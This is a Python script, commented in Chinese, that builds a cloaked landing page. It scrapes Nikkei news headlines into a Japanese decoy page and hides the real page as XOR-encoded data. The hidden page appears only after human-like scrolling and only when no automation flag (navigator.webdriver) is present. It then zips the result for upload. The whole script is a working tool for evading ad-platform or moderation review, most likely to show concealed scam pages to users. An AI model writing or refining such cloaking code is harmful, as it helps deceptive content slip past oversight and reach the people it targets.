import os
import random
import string
import json
import base64
import shutil
import requests
import datetime
from bs4 import BeautifulSoup

# ================= 配置区 =================
TARGET_REAL_PAGE = "index.html"  # 您的真实落地页文件名
OUTPUT_ZIP_NAME = "upload_me"     # 最终生成的压缩包名称
XOR_KEY = random.randint(10, 250) # 随机加密密钥
# ==========================================

class LPAutomatorV5:
    def __init__(self):
        self.dist_dir = "dist_lp"
        self.white_file = "white_template.html"
        self.map = {}
        if os.path.exists(self.dist_dir): shutil.rmtree(self.dist_dir)
        os.makedirs(self.dist_dir, exist_ok=True)

    def _rand_str(self, length=8):
        return ''.join(random.choices(string.ascii_lowercase, k=length))

    def fetch_news_and_gen_white(self):
        """步骤 1: 实时采集日经新闻并生成长篇白页"""
        print("📡 正在采集最新财经资讯...")
        url = "https://www.nikkei.com/news/category/market/"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        try:
            res = requests.get(url, headers=headers, timeout=10)
            res.encoding = 'utf-8'
            soup = BeautifulSoup(res.text, 'html.parser')
            articles = []
            for item in soup.select('article')[:12]:
                title = item.find('span', class_=lambda x: x and 'title' in x)
                summary = item.find('p')
                if title:
                    articles.append({"t": title.get_text().strip(), "s": summary.get_text().strip() if summary else "詳細レポート..."})
            
            html = f"""<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><title>Market Insight</title>
            <style>body{{font-family:sans-serif;color:#333;line-height:1.8;padding:20px;background:#f4f4f4}}
            .c{{max-width:800px;margin:auto;background:#fff;padding:40px;box-shadow:0 0 10px rgba(0,0,0,0.1)}}
            .a{{margin-bottom:30px;border-bottom:1px solid #eee;padding-bottom:20px}}
            .t{{font-size:20px;color:#003366;font-weight:bold}}</style></head><body>
            <div class="c"><h2>マーケット速報 ({datetime.date.today()})</h2>"""
            for a in articles:
                html += f"<div class='a'><div class='t'>{a['t']}</div><p>{a['s']}</p></div>"
            html += "<div style='text-align:center;color:#999;font-size:12px'>© 2025 Market Insight Japan</div></div></body></html>"
            
            with open(self.white_file, "w", encoding="utf-8") as f: f.write(html)
            print("✅ 白页模板已生成（高度已适配滚动门槛）。")
        except Exception as e:
            print(f"❌ 采集失败: {e}，将使用基础模板。")

    def scramble_and_pack(self):
        """步骤 2: 执行 V5 级多态混淆"""
        print("🔐 正在执行 V5 级逻辑混淆...")
        with open(self.white_file, 'r', encoding='utf-8') as f:
            w_soup = BeautifulSoup(f.read(), 'html.parser')
            w_body = "".join([str(x) for x in w_soup.body.contents])
            w_title = w_soup.title.string

        with open(TARGET_REAL_PAGE, 'r', encoding='utf-8') as f:
            r_soup = BeautifulSoup(f.read(), 'html.parser')
            # 自动迁移素材
            for tag, attr in {'img':'src', 'link':'href', 'script':'src'}.items():
                for el in r_soup.find_all(tag):
                    src = el.get(attr)
                    if src and not src.startswith(('http', '//', 'data:')):
                        dest = os.path.join(self.dist_dir, src)
                        os.makedirs(os.path.dirname(dest), exist_ok=True)
                        if os.path.exists(src): shutil.copy(src, dest)

        # 混淆 ID/Class
        for tag in r_soup.find_all(True):
            if tag.has_attr('class'): tag['class'] = [self.map.setdefault(c, self._rand_str()) for c in tag['class']]
            if tag.has_attr('id'): tag['id'] = self.map.setdefault(tag['id'], self._rand_str())

        # XOR 加密逻辑
        raw_html = "".join([str(x) for x in r_soup.body.contents])
        encoded = [ord(c) ^ XOR_KEY for c in raw_html]
        v_data, v_key, v_res, v_check = [self._rand_str(6) for _ in range(4)]

        final_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0"><title>{w_title}</title>
        <style>body{{margin:0;padding:0}}#sc-v5{{min-height:210vh;background:#fff}}</style></head>
        <body><div id="sc-v5">{w_body}</div><script>
        (function(){{
            var {v_data}={json.dumps(encoded)}, {v_key}={XOR_KEY}, _r=false, _t=false;
            function _ex(){{
                if(_r||navigator.webdriver||document.visibilityState!=='visible')return;
                _r=true; try{{
                    var {v_res}={v_data}.map(function(c){{return String.fromCharCode(c^{v_key})}}).join('');
                    document.body.innerHTML={v_res};window.scrollTo(0,0);
                }}catch(e){{}}
            }}
            function {v_check}(){{ if(!_t&&window.scrollY>500){{_t=true;setTimeout(_ex,3200);}} }}
            window.addEventListener('scroll',{v_check});window.addEventListener('touchmove',{v_check});
        }})();</script></body></html>"""

        with open(os.path.join(self.dist_dir, "index.html"), "w", encoding="utf-8") as f: f.write(final_html)

    def create_zip(self):
        """步骤 3: 压缩打包"""
        print(f"📦 正在打包产物为 {OUTPUT_ZIP_NAME}.zip...")
        shutil.make_archive(OUTPUT_ZIP_NAME, 'zip', self.dist_dir)
        print(f"✨ 大功告成！最终产物: {os.getcwd()}\\{OUTPUT_ZIP_NAME}.zip")

if __name__ == "__main__":
    if not os.path.exists(TARGET_REAL_PAGE):
        print(f"❌ 错误: 找不到 {TARGET_REAL_PAGE}，请将真实落地页命名为此文件名。")
    else:
        flow = LPAutomatorV5()
        flow.fetch_news_and_gen_white()
        flow.scramble_and_pack()
        flow.create_zip()
        input("\n所有流程已自动完成，按回车退出...")